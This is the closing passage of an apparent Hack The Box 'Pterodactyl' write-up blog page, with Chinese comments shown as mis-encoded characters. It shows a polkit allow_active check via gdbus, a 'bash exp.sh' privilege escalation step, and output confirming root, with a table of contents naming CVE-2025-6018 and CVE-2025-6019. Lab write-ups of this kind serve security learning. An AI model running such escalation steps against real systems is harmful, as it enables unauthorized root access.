<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># éªŒè¯æ˜¯å¦æœ‰allow_activeæƒé™</span></span><br><span class="line">gdbus call --system --dest org.freedesktop.login1 \</span><br><span class="line">    --object-path /org/freedesktop/login1 \</span><br><span class="line">    --method org.freedesktop.login1.Manager.CanReboot</span><br><span class="line"><span class="comment"># æ‰§è¡Œææƒè„šæœ¬</span></span><br><span class="line">bash exp.sh</span><br></pre></td></tr></table></figure>

<p>å³å¯æ‹¿åˆ°rootæƒé™</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">bash-5.2# <span class="built_in">id</span></span><br><span class="line">uid=1002(phileasfogg3) gid=100(<span class="built_in">users</span>) euid=0(root) <span class="built_in">groups</span>=100(<span class="built_in">users</span>)</span><br></pre></td></tr></table></figure>




  </div>
</article>



        
          <div id="footer-post-container">
  <div id="footer-post">

    <div id="nav-footer" style="display: none">
      <ul>
        
          <li><a href="/">Home</a></li>
        
          <li><a href="/archives/">Writing</a></li>
        
          <li><a href="/categories/">Category</a></li>
        
          <li><a href="/tags/">tags</a></li>
        
          <li><a href="/about/">About</a></li>
        
          <li><a href="/search/">Search</a></li>
        
      </ul>
    </div>

    
    
      <div id="toc-footer" style="display: none">
        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Nmap"><span class="toc-number">1.</span> <span class="toc-text">Nmap</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Subdomain"><span class="toc-number">2.</span> <span class="toc-text">Subdomain</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CVE-2025-49132"><span class="toc-number">3.</span> <span class="toc-text">CVE-2025-49132</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#USER"><span class="toc-number">4.</span> <span class="toc-text">USER</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ROOT"><span class="toc-number">5.</span> <span class="toc-text">ROOT</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#CVE-2025-6018"><span class="toc-number">5.1.</span> <span class="toc-text">CVE-2025-6018</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#CVE-2025-6019"><span class="toc-number">5.2.</span> <span class="toc-text">CVE-2025-6019</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8"><span class="toc-number">5.3.</span> <span class="toc-text">åˆ©ç”¨</span></a></li></ol></li></ol>
      </div>
    

    <div id="share-footer" style="display: none">
      <ul>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://thr2on1.github.io/2026/02/14/HTB-Pterodactyl/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://thr2on1.github.io/2026/02/14/HTB-Pterodactyl/&text=HTB-Pterodactyl"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://thr2on1.github.io/2026/02/14/HTB-Pterodactyl/&title=HTB-Pterodactyl"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://thr2on1.github.io/2026/02/14/HTB-Pterodactyl/&is_video=false&description=HTB-Pterodactyl"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=HTB-Pterodactyl&body=Check out this article: https://thr2on1.github.io/2026/02/14/HTB-Pterodactyl/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://thr2on1.github.io/2026/02/14/HTB-Pterodactyl/&title=HTB-Pterodactyl"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://thr2on1.github.io/2026/02/14/HTB-Pterodactyl/&title=HTB-Pterodactyl"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://thr2on1.github.io/2026/02/14/HTB-Pterodactyl/&title=HTB-Pterodactyl"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://thr2on1.github.io/2026/02/14/HTB-Pterodactyl/&title=HTB-Pterodactyl"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://thr2on1.github.io/2026/02/14/HTB-Pterodactyl/&name=HTB-Pterodactyl&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://thr2on1.github.io/2026/02/14/HTB-Pterodactyl/&t=HTB-Pterodactyl"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
</ul>

    </div>

    <div id="actions-footer">
        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
        
          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
        
        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
    </div>

  </div>
</div>

        
        <footer id="footer">
  <div class="footer-left">
    Copyright &copy;
    
    
    2025-2026
    Thr2on1
  </div>
  <div class="footer-right">
    <nav>
      <ul>
        <!--
       --><li><a href="/">Home</a></li><!--
     --><!--
       --><li><a href="/archives/">Writing</a></li><!--
     --><!--
       --><li><a href="/categories/">Category</a></li><!--
     --><!--
       --><li><a href="/tags/">tags</a></li><!--
     --><!--
       --><li><a href="/about/">About</a></li><!--
     --><!--
       --><li><a href="/search/">Search</a></li><!--
     -->
      </ul>
    </nav>
  </div>
</footer>

    </div>
    <!-- styles -->



  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>


    <!-- jquery -->

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>




<!-- clipboard -->

  
    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
  
  <script type="text/javascript">
  $(function() {
    // copy-btn HTML
    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
    btn += '<i class="fa-regular fa-clone"></i>';
    btn += '</span>';
    // mount it!
    $(".highlight table").before(btn);
    var clip = new ClipboardJS('.btn-copy', {
      text: function(trigger) {
        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
      }
    });
    clip.on('success', function(e) {
      e.trigger.setAttribute('aria-label', "Copied!");
      e.clearSelection();
    })
  })
  </script>


<script src="/js/main.js"></script>

<!-- search -->

<!-- Baidu Analytics -->

<!-- Cloudflare Analytics -->

<!-- Disqus Comments -->

<!-- utterances Comments -->

</body>
</html>
